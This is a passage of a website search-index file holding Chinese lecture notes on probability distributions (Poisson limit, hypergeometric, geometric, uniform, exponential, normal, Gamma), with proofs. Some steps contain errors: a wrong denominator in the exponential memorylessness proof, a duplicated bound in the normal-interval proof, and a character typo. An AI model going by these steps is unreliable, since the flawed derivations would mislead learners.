k | X = i) = \\sum_{i=k}^\u221e \\frac{\u03bb^i e^{-\u03bb}}{i!} C_i^k p^k (1-p)^{i-k}\\)$ $\\(= \\frac{(\u03bbp)^k}{k!}e^{-\u03bb} \\sum_{i=k}^\u221e \\frac{[\u03bb(1-p)]^{i-k}}{(i-k)!} = \\frac{(\u03bbp)^k}{k!}e^{-\u03bb}e^{\u03bb(1-p)} = \\frac{(\u03bbp)^k}{k!}e^{-\u03bbp}\\)$</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#225","title":"2.2.5 \u200b\u8d85\u200b\u51e0\u4f55\u200b\u5206\u5e03","text":"<p>\u200b\u5b9a\u4e49\u200b 2.6 \u200b\u8d85\u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b</p> <p>\u200b\u82e5\u200b\u968f\u673a\u53d8\u91cf\u200b \\(X\\) \u200b\u7684\u200b\u6982\u7387\u5206\u5e03\u200b\u4e3a\u200b:</p> \\[P(X = k) = \\frac{C_D^k C_{N-D}^{n-k}}{C_N^n}, \\quad k = 0, 1, ..., n.\\] <p>\u200b\u5219\u200b\u79f0\u200b \\(X\\) \u200b\u670d\u4ece\u200b\u8d85\u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b, \u200b\u8bb0\u200b\u4f5c\u200b \\(X \u223c H(N, D, n)\\), \u200b\u5176\u4e2d\u200b \\(N, D, n\\) \u200b\u6ee1\u8db3\u200b \\(N \u2265 D \u2265 0\\).</p> <p>Example</p> <p>\u200b\u888b\u4e2d\u200b\u6709\u200b \\(N\\) \u200b\u4e2a\u7403\u200b,\u200b\u5176\u4e2d\u200b \\(D\\) \u200b\u4e2a\u200b\u7ea2\u7403\u200b,\u200b\u4ece\u4e2d\u200b\u4e0d\u653e\u200b\u56de\u5730\u200b\u62bd\u53d6\u200b \\(n\\) \u200b\u4e2a\u200b,\u200b\u4ee5\u200b \\(X\\) \u200b\u8868\u793a\u200b\u62bd\u5230\u200b\u7684\u200b\u7ea2\u7403\u200b\u6570\u200b, \\(X\\) \u200b\u670d\u4ece\u200b\u8d85\u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b\u3002\u200b\u5982\u679c\u200b\u8fdb\u884c\u200b\u653e\u200b\u56de\u200b\u62bd\u6837\u200b, \u200b\u5219\u200b \\(X\\) \u200b\u670d\u4ece\u200b\u4e8c\u9879\u5206\u5e03\u200b.</p> <p>\u200b\u4e0b\u9762\u200b\u7684\u200b\u5b9a\u7406\u200b\u6307\u51fa\u200b, \u200b\u4e8c\u9879\u5206\u5e03\u200b\u662f\u200b\u8d85\u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b\u5728\u200b \\(N\\to+\\infty\\) \u200b\u548c\u200b \\(D/N\\to p\\) \u200b\u60c5\u51b5\u200b\u4e0b\u200b\u7684\u200b\u6781\u9650\u200b.</p> <p>\u200b\u5b9a\u7406\u200b 2.3</p> <p>\u200b\u5bf9\u4e8e\u200b\u56fa\u5b9a\u200b\u7684\u200b \\(n\\),\u200b\u5f53\u200b \\(N \\to \\infty, D/N \\to p\\) \u200b\u65f6\u200b, \u200b\u6709\u200b</p> \\[\\lim_{N\u2192\u221e} \\frac{C_D^k C_{N-D}^{n-k}}{C_N^n} = C_n^k p^k (1-p)^{n-k}, \\quad k \u2265 0.\\] <p>\u200b\u8bc1\u660e\u200b: </p> <p>\u200b\u5728\u200b \\(0 &lt; p &lt; 1\\) \u200b\u7684\u200b\u6761\u4ef6\u200b\u4e0b\u200b, \u200b\u5f53\u200b \\(N\\) \u200b\u5145\u5206\u200b\u5927\u65f6\u200b, \\(n &lt; D &lt; N\\), \u200b\u4e14\u200b n \u200b\u662f\u200b\u56fa\u5b9a\u200b\u7684\u200b, \u200b\u6613\u77e5\u200b $\\(\\frac{C_D^k C_{N-D}^{n-k}}{C_N^n} = \\frac{D!}{k!(D-k)!} \\cdot \\frac{(N-D)!}{(n-k)!(N-D-n+k)!} \\cdot \\frac{n!(N-n)!}{N!}\\)$ $\\(= \\frac{n!}{k!(n-k)!} \\cdot \\frac{D(D-1)\u22ef(D-k+1)}{N^k} \\times \\frac{(N-D)(N-D-1)\u22ef(N-D-n+k+1)}{N^{n-k}} \\times \\frac{N^n}{N(N-1)\u22ef(N-n+1)}\\)$ $\\(= C_n^k \\left(\\prod_{i=1}^k \\frac{D-i+1}{N}\\right) \\left(\\prod_{i=1}^{n-k} \\frac{N-D-i+1}{N}\\right) \\left(\\prod_{i=1}^n \\frac{N}{N-i+1}\\right)\\)$ $\\(\u2192 C_n^k p^k (1-p)^{n-k} \\quad (N \u2192 \u221e)\\)$</p> <p>\u200b\u5b9a\u7406\u200b\u7684\u200b\u76f4\u89c2\u200b\u89e3\u91ca\u200b\u662f\u200b: \u200b\u5f53\u200b \\(N\\) \u200b\u5f88\u5927\u200b, \u200b\u6b21\u54c1\u200b\u5360\u200b\u6bd4\u200b\u4e3a\u200b \\(p\\) \u200b\u65f6\u200b, \u200b\u653e\u4e0d\u653e\u200b\u56de\u200b\u5bf9\u200b\u8fd1\u4f3c\u200b\u6ca1\u6709\u200b\u5f71\u54cd\u200b. \u200b\u56e0\u6b64\u200b\u968f\u673a\u200b\u62bd\u53d6\u200b \\(n\\) \u200b\u4e2a\u200b\u53ef\u4ee5\u200b\u770b\u6210\u200b\u6709\u653e\u56de\u200b\u62bd\u6837\u200b.</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#226","title":"2.2.6 \u200b\u51e0\u4f55\u200b\u5206\u5e03","text":"<p>\u200b\u5b9a\u4e49\u200b 2.7 \u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b</p> <p>\u200b\u82e5\u200b\u968f\u673a\u53d8\u91cf\u200b \\(X\\) \u200b\u7684\u200b\u6240\u6709\u200b\u53ef\u80fd\u200b\u53d6\u503c\u200b\u4e3a\u200b\u6b63\u6574\u6570\u200b,\u200b\u4e14\u200b\u6982\u7387\u5206\u5e03\u200b\u4e3a\u200b:</p> \\[P(X = k) = (1-p)^{k-1}p, \\quad k = 1, 2, ...,\\] <p>\u200b\u5219\u200b\u79f0\u200b \\(X\\) \u200b\u670d\u4ece\u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b, \u200b\u8bb0\u200b\u4f5c\u200b \\(X \u223c G(p)\\), \u200b\u5176\u4e2d\u200b \\(0 &lt; p &lt; 1\\).</p> <p>Example</p> <p>\u200b\u5728\u200b\u4f2f\u52aa\u5229\u200b\u8bd5\u9a8c\u200b\u4e2d\u200b,\u200b\u6bcf\u6b21\u200b\u8bd5\u9a8c\u200b\u6210\u529f\u200b\u7684\u200b\u6982\u7387\u200b\u4e3a\u200b \\(p\\), \u200b\u5219\u200b\u9996\u6b21\u200b\u6210\u529f\u200b\u6240\u200b\u9700\u200b\u7684\u200b\u8bd5\u9a8c\u200b\u6b21\u6570\u200b \\(X\\) \u200b\u670d\u4ece\u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b\u3002</p> <p>\u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b\u6709\u200b\u4e00\u4e2a\u200b\u91cd\u8981\u200b\u7684\u200b\u6027\u8d28\u200b, \u200b\u79f0\u4e3a\u200b\u65e0\u200b\u8bb0\u5fc6\u6027\u200b, \u200b\u5373\u200b\u5bf9\u4e8e\u200b\u4efb\u610f\u200b\u6b63\u6574\u6570\u200b \\(n\\) \u200b\u548c\u200b \\(m\\), \u200b\u6709\u200b:</p> \\[P(X &gt; n+m | X &gt; m) = P(X &gt; n),\\] <p>\u200b\u53cd\u4e4b\u200b\u4e5f\u200b\u662f\u200b\u6b63\u786e\u200b\u7684\u200b, \u200b\u53ef\u4ee5\u200b\u5199\u6210\u200b\u5982\u4e0b\u200b\u5b9a\u7406\u200b:</p> <p>\u200b\u5b9a\u7406\u200b 2.4</p> <p>\u200b\u82e5\u200b\u968f\u673a\u53d8\u91cf\u200b \\(X\\) \u200b\u662f\u200b\u53ea\u53d6\u200b\u6b63\u6574\u6570\u200b\u7684\u200b\u79bb\u6563\u200b\u578b\u200b\u968f\u673a\u53d8\u91cf\u200b, \u200b\u4e14\u200b \\(X\\) \u200b\u5177\u6709\u200b\u65e0\u200b\u8bb0\u5fc6\u6027\u200b, \u200b\u5219\u200b \\(X\\) \u200b\u5fc5\u7136\u200b\u670d\u4ece\u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b.</p> <p>\u200b\u8bc1\u660e\u200b: \u200b\u7531\u200b\u65e0\u200b\u8bb0\u5fc6\u6027\u200b\u53ef\u200b\u5f97\u200b</p> \\[P(X &gt; n+m | X &gt; m) = \\frac{P(X &gt; n+m)}{P(X &gt; m)} = P(X &gt; n),\\] <p>\u200b\u5219\u200b</p> \\[ P(X&gt;n+m)=P(X&gt;n)P(X&gt;m). \\] <p>\u200b\u5c06\u200b \\(n\\) \u200b\u66ff\u6362\u200b\u4e3a\u200b \\(n-1\\), \u200b\u6709\u200b</p> \\[P(X &gt; n+m-1) = P(X &gt; n-1)P(X &gt; m).\\] <p>\u200b\u4e24\u200b\u5f0f\u200b\u76f8\u51cf\u200b</p> \\[P(X = n+m) = P(X = n)P(X &gt; m).\\] <p>\u200b\u4ee4\u200b \\(P(X = 1) = p\\), \u200b\u53d6\u200b \\(n = m = 1\\) \u200b\u5f97\u200b</p> \\[P(X = 2) = p(1-p).\\] <p>\u200b\u53d6\u200b \\(n = 2, m = 1\\) \u200b\u5f97\u200b</p> \\[P(X = 3) = P(X = 2)P(X &gt; 1) = p(1-p)^2.\\] <p>\u200b\u7531\u200b\u5f52\u7eb3\u6cd5\u200b\u53ef\u200b\u5f97\u200b</p> \\[P(X = k) = p(1-p)^{k-1},\\] <p>\u200b\u56e0\u6b64\u200b \\(X\\) \u200b\u670d\u4ece\u200b\u51e0\u4f55\u200b\u5206\u5e03\u200b\u3002</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#227","title":"2.2.7 \u200b\u79bb\u6563\u200b\u5747\u5300\u5206\u5e03","text":"<p>\u200b\u5b9a\u4e49\u200b 2.8 (\u200b\u79bb\u6563\u200b\u5747\u5300\u5206\u5e03\u200b)</p> <p>\u200b\u82e5\u200b\u968f\u673a\u53d8\u91cf\u200b X \u200b\u7684\u200b\u6982\u7387\u5206\u5e03\u200b\u4e3a\u200b:</p> \\[P(X = k) = \\frac{1}{N}, \\quad k = 1, \u22ef, N.\\] <p>\u200b\u5219\u200b\u79f0\u200b \\(X\\) \u200b\u670d\u4ece\u200b\u79bb\u6563\u200b\u5747\u5300\u5206\u5e03\u200b\u3002</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#23","title":"2.3 \u200b\u8fde\u7eed\u578b\u200b\u968f\u673a\u53d8\u91cf","text":""},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#231","title":"2.3.1 \u200b\u8fde\u7eed\u578b\u200b\u968f\u673a\u53d8\u91cf\u200b\u7684\u200b\u5b9a\u4e49","text":"<p>\u200b\u5b9a\u4e49\u200b 2.9 \u200b\u8fde\u7eed\u578b\u200b\u968f\u673a\u53d8\u91cf\u200b</p> <p>\u200b\u8bbe\u200b \\(X\\) \u200b\u662f\u200b\u4e00\u4e2a\u200b\u968f\u673a\u53d8\u91cf\u200b, \u200b\u5982\u679c\u200b\u5b58\u5728\u200b \\(p(x)\\) \u200b\u4f7f\u5f97\u200b</p> \\[P(a \\leqslant X \\leqslant b) = \\int_a^b p(x)dx, \\quad \\forall a &lt; b.\\] <p>\u200b\u5219\u200b\u79f0\u200b \\(X\\) \u200b\u662f\u200b\u8fde\u7eed\u578b\u200b\u968f\u673a\u53d8\u91cf\u200b,\u200b\u5e76\u79f0\u200b \\(p(\u00b7)\\) \u200b\u4e3a\u200b \\(X\\) \u200b\u7684\u200b\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u200b(\u200b\u4e5f\u200b\u79f0\u4e3a\u200b\u5206\u5e03\u200b\u5bc6\u5ea6\u200b). \u200b\u6709\u65f6\u200b\u4e5f\u200b\u76f4\u63a5\u200b\u5c06\u200b \\(X\\) \u200b\u7684\u200b\u6982\u7387\u5bc6\u5ea6\u51fd\u6570\u200b\u8bb0\u200b\u4f5c\u200b \\(p_X(\\cdot)\\).</p> <p>\u200b\u8fde\u7eed\u200b\u968f\u673a\u53d8\u91cf\u200b\u6709\u200b\u4ee5\u4e0b\u200b\u6027\u8d28\u200b:</p> <p>(1) \u200b\u975e\u200b\u8d1f\u6027\u200b: \\(p(x) \\geqslant 0\\);</p> <p>(2) \u200b\u89c4\u8303\u6027\u200b: \\(\\int_{-\\infty}^{+\\infty} p(x)dx = 1\\);</p> <p>(3) \\(P(X = x) = 0\\), \u200b\u5373\u200b\u9009\u4e2d\u200b\u4efb\u610f\u200b\u4e00\u70b9\u200b\u7684\u200b\u6982\u7387\u200b\u90fd\u200b\u4e3a\u200b \\(0\\);</p> <p>(4) \u200b\u82e5\u200b \\(p(\\cdot)\\) \u200b\u5728\u200b \\(x\\) \u200b\u5904\u200b\u8fde\u7eed\u200b, \u200b\u5219\u200b \\(P(X \\in [x, x + \\Delta x]) = p(x)\\Delta x + o(\\Delta x)\\).</p> <p>\u200b\u4e0b\u9762\u200b\u4ecb\u7ecd\u200b\u4e00\u4e9b\u200b\u5e38\u7528\u200b\u7684\u200b\u8fde\u7eed\u6027\u200b\u968f\u673a\u53d8\u91cf\u200b\u7684\u200b\u5206\u5e03\u200b.</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#232","title":"2.3.2 \u200b\u5747\u5300\u5206\u5e03","text":"<p>\u200b\u5b9a\u4e49\u200b 2.10 \u200b\u5747\u5300\u5206\u5e03\u200b</p> <p>\u200b\u82e5\u200b\u968f\u673a\u53d8\u91cf\u200b \\(X\\) \u200b\u7684\u200b\u6982\u7387\u5bc6\u5ea6\u200b\u4e3a\u200b:</p> \\[p(x) = \\begin{cases} \\frac{1}{b-a}, &amp; a \u2264 x \u2264 b;\\\\ 0, &amp; \\text{\u200b\u5176\u4ed6\u200b}. \\end{cases}\\] <p>\u200b\u5176\u4e2d\u200b \\(a &lt; b\\), \u200b\u5219\u200b\u79f0\u200b \\(X\\) \u200b\u670d\u4ece\u200b\u533a\u95f4\u200b \\([a, b]\\) \u200b\u4e0a\u200b\u7684\u200b\u5747\u5300\u5206\u5e03\u200b, \u200b\u8bb0\u200b\u4f5c\u200b \\(X \u223c U(a, b)\\).</p> <p>\u200b\u5747\u5300\u5206\u5e03\u200b\u7684\u200b\u5206\u5e03\u200b\u51fd\u6570\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7b80\u5199\u200b\u4e3a\u200b \\(p(x) = \\frac{1}{b-a}1_{\\{a\u2264x\u2264b\\}}\\)\u3002</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#233","title":"2.3.3 \u200b\u6307\u6570\u5206\u5e03","text":"<p>\u200b\u5b9a\u4e49\u200b 2.11 \u200b\u6307\u6570\u5206\u5e03\u200b</p> <p>\u200b\u82e5\u200b\u968f\u673a\u53d8\u91cf\u200b \\(X\\) \u200b\u7684\u200b\u6982\u7387\u5bc6\u5ea6\u200b\u4e3a\u200b:</p> \\[p(x) = \\begin{cases} \u03bbe^{-\u03bbx}, &amp; x \u2265 0;\\\\ 0, &amp; x &lt; 0 \\end{cases}\\] <p>\u200b\u5176\u4e2d\u200b \\(\u03bb &gt; 0\\), \u200b\u5219\u200b\u79f0\u200b \\(X\\) \u200b\u670d\u52a1\u200b\u53c2\u6570\u200b\u4e3a\u200b \\(\u03bb\\) \u200b\u7684\u200b\u6307\u6570\u5206\u5e03\u200b, \u200b\u8bb0\u200b\u4f5c\u200b \\(X \u223c Exp(\u03bb)\\).</p> <p>\u200b\u82e5\u200b \\(X\\) \u200b\u670d\u4ece\u200b\u53c2\u6570\u200b\u4e3a\u200b \\(\u03bb\\) \u200b\u7684\u200b\u6307\u6570\u5206\u5e03\u200b,\u200b\u5219\u200b\u5bf9\u4e8e\u200b \\(0 \\leq a &lt; b\\), \u200b\u6709\u200b: $\\(P(a &lt; X &lt; b) = \u03bb\\int_a^b e^{-\u03bbx}dx = e^{-\u03bba} - e^{-\u03bbb},\\)$ $\\(P(X &gt; a) = e^{-\u03bba}.\\)$</p> <p>\u200b\u5b9a\u7406\u200b 2.5 \u200b\u6307\u6570\u5206\u5e03\u200b\u7684\u200b\u65e0\u200b\u8bb0\u5fc6\u6027\u200b</p> <p>\u200b\u8bbe\u200b \\(X \u223c Exp(\u03bb)\\), \u200b\u5219\u200b\u5bf9\u4e8e\u200b\u4efb\u610f\u200b \\(t, s \\geq 0\\), \u200b\u6709\u200b</p> \\[P(X - s &gt; t | X &gt; s) = e^{-\u03bbt}.\\] <p>\u200b\u8bc1\u660e\u200b: </p> <p>\u200b\u7531\u200b\u6761\u4ef6\u200b\u6982\u7387\u200b\u7684\u200b\u5b9a\u4e49\u200b, \u200b\u6709\u200b \\(P(X - s &gt; t | X &gt; s) = \\frac{P(X-s&gt;t)}{P(X&gt;s)} = \\frac{e^{-\u03bb(s+t)}}{e^{-\u03bbt}} = e^{-\u03bbt} = P(X &gt; t)\\)\u3002</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#234","title":"2.3.4 \u200b\u6b63\u6001\u5206\u5e03","text":"<p>\u200b\u5b9a\u4e49\u200b 2.3.4 (\u200b\u6b63\u6001\u5206\u5e03\u200b)</p> <p>\u200b\u82e5\u200b\u968f\u673a\u53d8\u91cf\u200b X \u200b\u7684\u200b\u6982\u7387\u5bc6\u5ea6\u200b\u4e3a\u200b: $\\(p(x) = \\frac{1}{\\sqrt{2\u03c0\u03c3^2}} \\exp\\left\\{-\\frac{(x-\u03bc)^2}{2\u03c3^2}\\right\\}\\)$ \u200b\u5176\u4e2d\u200b \u03bc \u2208 \u211d, \u03c3 &gt; 0,\u200b\u5219\u200b\u79f0\u200b X \u200b\u670d\u4ece\u200b\u53c2\u6570\u200b\u4e3a\u200b \u03bc, \u03c3 \u200b\u7684\u200b\u6b63\u6001\u5206\u5e03\u200b,\u200b\u8bb0\u200b\u4f5c\u200b X \u223c N(\u03bc, \u03c3\u00b2)\u3002</p> <p>\u200b\u5f53\u200b \u03bc = 0, \u03c3\u00b2 = 1 \u200b\u65f6\u200b,\u200b\u79f0\u4e3a\u200b\u6807\u51c6\u200b\u6b63\u6001\u5206\u5e03\u200b N(0, 1),\u200b\u5176\u200b\u6982\u7387\u5bc6\u5ea6\u200b\u4e3a\u200b: $\\(p(x) = \\frac{1}{\\sqrt{2\u03c0}}e^{-\\frac{x^2}{2}}.\\)$</p> <p>\u200b\u9996\u5148\u200b\u9a8c\u8bc1\u200b\u6b63\u6001\u5206\u5e03\u200b\u7684\u200b\u5bc6\u5ea6\u200b\u51fd\u6570\u200b\u6ee1\u8db3\u200b\u89c4\u8303\u6027\u200b:\\(\\int_{-\u221e}^{+\u221e} \\frac{1}{\\sqrt{2\u03c0}}e^{-\\frac{x^2}{2}}dx = 1\\)\u3002\u200b\u4e3a\u6b64\u200b,\u200b\u8bb0\u200b \\(\u03c6(x) = \\frac{1}{\\sqrt{2\u03c0}}e^{-\\frac{x^2}{2}}\\),\u200b\u5229\u7528\u200b\u6781\u5750\u6807\u200b\u53d8\u6362\u200b: $\\(\\int_{-\u221e}^\u221e \\frac{1}{\\sqrt{2\u03c0}}e^{-\\frac{x^2}{2}}dx \u00d7 \\int_{-\u221e}^\u221e \\frac{1}{\\sqrt{2\u03c0}}e^{-\\frac{y^2}{2}}dy = \\frac{1}{2\u03c0}\\int\\int_{\u211d\u00b2} e^{-\\frac{x^2+y^2}{2}}dxdy.\\)$</p> <p>\u200b\u5229\u7528\u200b\u6781\u5750\u6807\u200b\u53d8\u6362\u200b: $\\(x = r\\cos \u03b8, y = r\\sin \u03b8 \u21d2 \\left|\\begin{matrix} \\frac{\u2202x}{\u2202r} &amp; \\frac{\u2202y}{\u2202r}\\\\ \\frac{\u2202x}{\u2202\u03b8} &amp; \\frac{\u2202y}{\u2202\u03b8} \\end{matrix}\\right| = r.\\)$</p> <p>\u200b\u56e0\u6b64\u200b, $\\(\\frac{1}{2\u03c0}\\int_0^{2\u03c0} \\left(\\int_0^\u221e e^{-\\frac{r^2}{2}}rdr\\right)d\u03b8 = \\int_0^\u221e e^{-R}dR = 1\\)$</p> <p>\u200b\u5bf9\u4e8e\u200b\u4e00\u822c\u200b\u7684\u200b\u6b63\u6001\u5206\u5e03\u200b \\(p(x) = \\frac{1}{\\sqrt{2\u03c0\u03c3^2}}e^{-\\frac{(x-\u03bc)^2}{2\u03c3^2}}\\),\u200b\u4ee4\u200b \\(y = \\frac{x-\u03bc}{\u03c3}\\),\u200b\u6709\u200b $\\(\\int_{-\u221e}^\u221e \\frac{1}{\\sqrt{2\u03c0}\u00b7\u03c3}e^{-\\frac{(x-\u03bc)^2}{2\u03c3^2}}dx = \\int_{-\u221e}^\u221e \\frac{1}{\\sqrt{2\u03c0}}e^{-\\frac{y^2}{2}}dy = 1.\\)$</p> <p>\u200b\u8bb0\u200b\u6807\u51c6\u200b\u6b63\u6001\u5206\u5e03\u200b\u7684\u200b\u5206\u5e03\u200b\u51fd\u6570\u200b\u4e3a\u200b $\\(\u03a6(x) = \\int_{-\u221e}^x \u03c6(x)dx,\\)$</p> <p>\u200b\u8fd9\u662f\u200b\u4e00\u4e2a\u200b\u5e38\u7528\u200b\u7684\u200b\u51fd\u6570\u200b,\u200b\u53ef\u4ee5\u200b\u67e5\u8868\u200b\u5f97\u5230\u200b\u3002\u200b\u6ce8\u610f\u200b,\u03a6(\u2212x) = 1 \u2212 \u03a6(x)\u3002\u200b\u82e5\u200b X \u223c N(\u03bc, \u03c3\u00b2),\u200b\u5219\u200b \\(Y = \\frac{X-\u03bc}{\u03c3} \u223c N(0, 1)\\) \u200b\u79f0\u4e3a\u200b\u6807\u51c6\u5316\u200b\u53d8\u6362\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5229\u7528\u200b\u6807\u51c6\u200b\u6b63\u6001\u5206\u5e03\u200b\u7684\u200b\u5206\u5e03\u200b\u51fd\u6570\u200b\u6765\u200b\u8ba1\u7b97\u200b\u4e00\u822c\u200b\u6b63\u6001\u5206\u5e03\u200b\u7684\u200b\u6982\u7387\u200b\u3002</p> <p>\u200b\u547d\u9898\u200b 2.3.2</p> <p>\u200b\u8bbe\u200b X \u223c N(\u03bc, \u03c3\u00b2),\u200b\u5219\u200b $\\(P(a &lt; X &lt; b) = \\int_a^b \\frac{1}{\u03c3}\u03c6\\left(\\frac{x-\u03bc}{\u03c3}\\right)dx = \u03a6\\left(\\frac{b-\u03bc}{\u03c3}\\right) - \u03a6\\left(\\frac{a-\u03bc}{\u03c3}\\right).\\)$</p> <p>\u200b\u8bc1\u660e\u200b:\u200b\u4ee4\u200b \\(Y = \\frac{X-\u03bc}{\u03c3} \u223c N(0, 1)\\),\u200b\u5219\u200b \\(\\{a &lt; X &lt; b\\} = \\left\\{\\frac{b-\u03bc}{\u03c3} &lt; Y &lt; \\frac{b-\u03bc}{\u03c3}\\right\\}\\),\u200b\u56e0\u6b64\u200b $\\(P(a &lt; X &lt; b) = P\\left(\\frac{b-\u03bc}{\u03c3} &lt; Y &lt; \\frac{b-\u03bc}{\u03c3}\\right) = \u03a6\\left(\\frac{b-\u03bc}{\u03c3}\\right) - \u03a6\\left(\\frac{a-\u03bc}{\u03c3}\\right).\\)$</p> <p>\u200b\u6ce8\u200b 9:\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u9a8c\u8bc1\u200b\u516c\u5f0f\u200b: $\\(P(a &lt; X &lt; b) = \\int_a^b \\frac{1}{\u03c3}\u03c6\\left(\\frac{x-\u03bc}{\u03c3}\\right)dx = \u03a6\\left(\\frac{b-\u03bc}{\u03c3}\\right) - \u03a6\\left(\\frac{a-\u03bc}{\u03c3}\\right). \\quad (2.3.1)\\)$</p> <p>\u200b\u63a8\u8bba\u200b 2.3.1</p> <p>\u200b\u8bbe\u200b X \u223c N(\u03bc, \u03c3\u00b2),\u200b\u5219\u200b\u5bf9\u4e8e\u200b\u4efb\u610f\u200b k,\u200b\u6709\u200b $\\(P(\u03bc - k\u03c3 &lt; X &lt; \u03bc + k\u03c3) = \u03a6(k) - \u03a6(-k) = 2\u03a6(k) - 1.\\)$</p> <p>\u200b\u6ce8\u200b 10:\u200b\u7531\u4e8e\u200b \u03a6(3) = 0.9987,\u200b\u56e0\u6b64\u200b $\\(P(\u03bc - 3\u03c3 &lt; X &lt; \u03bc + 3\u03c3) = \u03a6(3) - \u03a6(-3) = 0.9974.\\)$</p> <p>\u200b\u8fd9\u200b\u8bf4\u660e\u200b X \u200b\u51e0\u4e4e\u200b\u5168\u90e8\u200b\u843d\u200b\u5728\u200b\u533a\u95f4\u200b (\u03bc \u2212 3\u03c3, \u03bc + 3\u03c3) \u200b\u5185\u200b,\u200b\u8fd9\u200b\u5c31\u662f\u200b\u8457\u540d\u200b\u7684\u200b 3\u03c3 \u200b\u539f\u5219\u200b\u3002</p>"},{"location":"notes/Mathematics%20in%20Artificial%20Intelligence/Chapter%2002%20%E9%9A%8F%E6%9C%BA%E5%8F%98%E9%87%8F%E4%B8%8E%E6%A6%82%E7%8E%87%E5%88%86%E5%B8%83/#235","title":"2.3.5 \u0393 \u200b\u5206\u5e03","text":"<p>\u200b\u5728\u200b\u4ecb\u7ecd\u200b \u0393 \u200b\u5206\u5e03\u200b\u4e4b\u524d\u200b,\u200b\u5148\u200b\u4ecb\u7ecd\u200b \u0393 \u200b\u51fd\u6570\u200b\u3002\u0393 \u200b\u51fd\u6570\u200b\u5b9a\u4e49\u200b\u4e3a\u200b:(0, +\u221e) \u2192 \u211d: $\\(\u0393(\u03b1) = \\int_0^{+\u221e} y^{\u03b1-1}e^{-y}dy.\\)$</p> <p>\u200b\u547d\u9898\u200b 2.3.1 (\u0393 \u200b\u51fd\u6570\u200b\u7684\u200b\u6027\u8d28\u200b)</p> <p>\u0393 \u200b\u51fd\u6570\u200b\u5177\u6709\u200b\u5982\u4e0b\u200b\u6027\u8d28\u200b: (1) \u0393(\u03b1+1) = \u03b1\u0393(\u03b1); (2) \u0393(1) = 1, \\(\u0393\\left(\\frac{1}{2}\\right) = \\sqrt{\u03c0}\\)\u3002</p> <p>\u200b\u6ce8\u200b 11:\u200b\u7531\u200b\u6027\u8d28\u200b (1),\u200b\u53ef\u4ee5\u200b\u9012\u63a8\u200b\u5f97\u5230\u200b,\u200b\u5bf9\u4e8e\u200b\u6b63\u6574\u6570\u200b n,\u200b\u6709\u200b \u0393(n+1) = n!,\u200b\u56e0\u6b64\u200b \u0393 \u200b\u51fd\u6570\u200b\u662f\u200b\u9636\u4e58\u200b\u7684\u200b\u63a8\u5e7f\u200b\u3002</p> <p>\u200b\u5b9a\u7406\u200b </p> <p>\u200b\u82e5\u200b \\(P(X=Y)=1\\), \u200b\u5219\u200b \\(X,Y\\) \u200b\u5177\u6709\u200b\u76f8\u540c\u200b\u7684\u200b\u5206\u5e03\u200b\u51fd\u6570\u200b.</p> <p>\u200b\u8bc1\u660e\u200b:</p> <p>\u200b\u7531\u4e8e\u200b \\(P(X=Y)=1\\), \u200b\u6545\u200b \\(P(X\\neq Y)=0\\).</p> \\[ \\{X\\leq t\\}=\\{X\\leq t, X=Y\\} \\bigcup \\{X\\leq t, X\\neq Y\\} \\] <p>\u200b\u6ce8\u610f\u200b\u5230\u200b \\(\\{X\\leq t, X=Y\\}\\) \u200b\u4e0e\u200b \\(\\{X\\leq t, X\\neq Y\\}\\) \u200b\u4e0d\u200b\u4ea4\u200b, \u200b\u6545\u200b</p> \\[ \\begin{align} P(X\\leq t)&amp;=P(X\\leq t, X=Y)+P(X\\leq t, X\\neq Y) \\\\ &amp;= P(X\\leq t, X=Y)+0 \\\\ &amp;= P(Y\\leq t, X=Y) \\\\ &amp;\\leq P(Y\\leq t) \\end{align} \\] <p>\u200b\u540c\u7406\u53ef\u8bc1\u200b \\(P(Y\\leq t)\\leq P(X\\leq t)\\), \u200b\u4e8e\u662f\u200b</p> \\[ P(X\\leq t)=P(Y\\leq t) \\] <p>\u200b\u6545\u200b \\(X,Y\\) 